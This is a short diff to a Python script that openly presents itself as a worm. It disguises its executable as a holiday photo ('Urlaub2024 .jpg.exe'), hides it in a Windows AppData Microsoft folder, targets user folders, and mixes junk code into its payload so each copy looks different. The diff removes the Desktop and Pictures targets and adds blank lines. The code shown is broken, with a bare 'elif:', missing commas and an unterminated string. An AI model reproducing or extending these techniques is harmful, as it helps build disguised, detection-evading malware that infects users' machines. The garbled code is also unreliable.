@@ -16,7 +16,7 @@ import subprocess
 import time
 
 
-WORM_NAME = "Urlaub2024.jpg.exe"
+WORM_NAME = "Urlaub2024 .jpg.exe"
 HIDDEN_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
 HIDDEN_FILE = os.path.join(HIDDEN_PATH, WORM_NAME)
 
@@ -31,9 +31,11 @@ TARGET_DIRS = [
 
 elif:
 
-TARGET_DIRS= [
-    os.path.expanduser("~\\Desktop")
-    os.path.expanduser("~\\Pictures")
+
+
+
+
+
 ]
 
 
@@ -67,6 +69,22 @@ payload_code = f"""
 def real_payload_{rnd1}():
      Version {rnd1}")
 """
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 code_blocks = [junk_code, payload_code]
 random.shuffle(code_blocks)
